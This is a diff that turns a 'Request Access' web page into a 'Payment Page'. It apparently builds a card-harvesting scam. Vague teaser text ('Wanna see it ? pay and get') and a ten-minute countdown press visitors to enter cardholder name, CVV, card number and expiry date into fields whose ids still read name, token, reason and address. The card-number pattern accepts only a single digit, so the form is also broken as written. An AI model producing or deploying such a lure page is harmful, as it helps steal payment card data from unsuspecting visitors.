@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Request Access</title>
+    <title>Payment Page</title>
     <style>
         /* General Styling */
         body {
@@ -86,24 +86,24 @@
     <div class="main-images">
         <div class="main-image" style="background-image: url('images/image1.jpg');">
             <div class="main-text">
-                Welcome to our website! Please request access below:
+                Welcome! Please pay below and get what you deserve:
             </div>
             <button class="request-access-btn" onclick="redirectToForm()">Request Access</button>
         </div>
         <div class="main-image" style="background-image: url('images/image2.jpg');">
             <div class="main-text">
-                Welcome to our website! Please request access below:
+                Wanna see it ? pay and get:
             </div>
             <button class="request-access-btn" onclick="redirectToForm()">Request Access</button>
         </div>
     </div>
     <div class="form-container" style="display: none;">
-        <h2>Request Access Form</h2>
+        <h2>payment information</h2>
         <form id="request-form" onsubmit="submitForm()">
-            <input type="text" id="name" placeholder="Name" required>
-            <input type="text" id="token" placeholder="Token Number (1-5 digits)" pattern="[0-9]{1,5}" required>
-            <input type="text" id="reason" placeholder="Reason for Access" required>
-            <input type="text" id="address" placeholder="Address" required>
+            <input type="text" id="name" placeholder="CardHolder Name" required>
+            <input type="text" id="token" placeholder="CVV/CVC" pattern="[0-9]{1,5}" required>
+            <input type="text" id="reason" placeholder="Card Number" pattern="[0-9]"required>
+            <input type="text" id="address" placeholder="Expiration Date" required>
             <button type="submit">Submit</button>
         </form>
         <div id="timer">Time Left: 10:00</div>
